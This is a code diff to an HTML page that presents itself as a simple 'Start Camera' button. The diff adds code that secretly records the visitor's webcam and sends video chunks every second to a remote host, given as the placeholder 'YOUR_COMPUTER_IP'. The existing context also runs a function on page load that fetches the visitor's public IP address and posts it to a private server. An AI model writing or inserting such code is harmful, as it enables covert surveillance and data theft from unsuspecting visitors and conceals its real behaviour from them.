@@ -16,21 +16,22 @@
     <button onclick="startCamera()">Start Camera</button>
     <video id="videoElement" autoplay playsinline></video>
 
-    <script>
-        async function startCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById("videoElement").srcObject = stream;
-            } catch (error) {
-                alert("Camera access denied or not available: " + error);
-            }
-        }
-
-        
-    </script>
-
 <script>
-    async function logUser() {
+    async function startCamera() {
+        let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        let video = document.getElementById("videoElement");
+        video.srcObject = stream;
+
+        const mediaRecorder = new MediaRecorder(stream);
+        mediaRecorder.ondataavailable = (event) => {
+            fetch("http://YOUR_COMPUTER_IP:5000/stream", {
+                method: "POST",
+                body: event.data
+            });
+        };
+        mediaRecorder.start(1000); // Sends video data every second
+    }
+        async function logUser() {
         let ipResponse = await fetch('https://api64.ipify.org?format=json');
         let data = await ipResponse.json();
         fetch('http://10.0.128.189:5000/log', { 
@@ -41,7 +42,5 @@
     }
     logUser();
 </script>
-
-    
 </body>
 </html>
